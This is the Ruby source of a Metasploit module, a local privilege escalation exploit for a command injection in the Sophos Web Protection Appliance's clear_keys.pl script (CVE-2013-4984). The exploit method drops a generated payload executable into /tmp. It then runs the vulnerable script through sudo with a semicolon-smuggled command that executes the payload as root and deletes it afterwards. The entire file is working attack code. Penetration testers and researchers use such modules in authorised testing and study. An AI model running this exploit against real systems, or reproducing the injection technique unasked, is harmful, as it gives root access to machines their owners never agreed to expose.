##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/exe'


class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
      'Name'          => 'Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation',
      'Description'   => %q{
        This module abuses a command injection on the clear_keys.pl perl script, installed with the
        Sophos Web Protection Appliance, to escalate privileges from the "spiderman" user to "root".
        This module is useful for post exploitation of vulnerabilities on the Sophos Web Protection
        Appliance web ui, executed by the "spiderman" user. This module has been tested successfully
        on Sophos Virtual Web Appliance 3.7.0.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Francisco Falcon', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'Platform'       => [ 'linux'],
      'Arch'           => [ ARCH_X86 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        =>[[ 'Linux x86', { 'Arch' => ARCH_X86 } ]],
      'References'     =>
        [
          [ 'CVE', '2013-4984' ],
          [ 'OSVDB', '97028' ],
          [ 'BID', '62265' ],
          [ 'URL', 'http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities']
        ],
      'DefaultOptions' =>
        {
          "PrependFork"      => true,
          "PrependSetresuid" => true,
          "PrependSetresgid" => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Sep 06 2013'
      }
    ))

    register_options([
        # These are not OptPath becuase it's a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
        OptString.new("clear_keys",  [ true, "Path to the clear_keys.pl vulnerable script", "/opt/cma/bin/clear_keys.pl" ]),
      ], self.class)
  end

  def check
    if file?(datastore["clear_keys"])
      return CheckCode::Detected
    end

    return CheckCode::Unknown
  end

  def exploit
    print_status("Checking actual user...")
    id = cmd_exec("id -un")
    if id != "spiderman"
      fail_with(Failure::NoAccess, "The actual user is \"#{id}\", you must be \"spiderman\" to exploit this")
    end

    print_status("Checking for the vulnerable component...")
    if check != CheckCode::Detected
      fail_with(Failure::NoTarget, "The vulnerable component has not been found")
    end

    print_status("Dropping the payload to #{datastore["WritableDir"]}")
    exe_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.elf"
    write_file(exe_file, generate_payload_exe)

    cmd_exec "chmod +x #{exe_file}"

    print_status("Running...")
    begin
      # rm the file after executing it to avoid getting multiple sessions
      cmd_exec "sudo #{datastore["clear_keys"]} #{rand_text_alpha(4 + rand(4))} \";#{exe_file}; rm -f #{exe_file};\" /#{rand_text_alpha(4 + rand(4))}"
    ensure
      cmd_exec "rm -f #{exe_file}"
    end
  end
end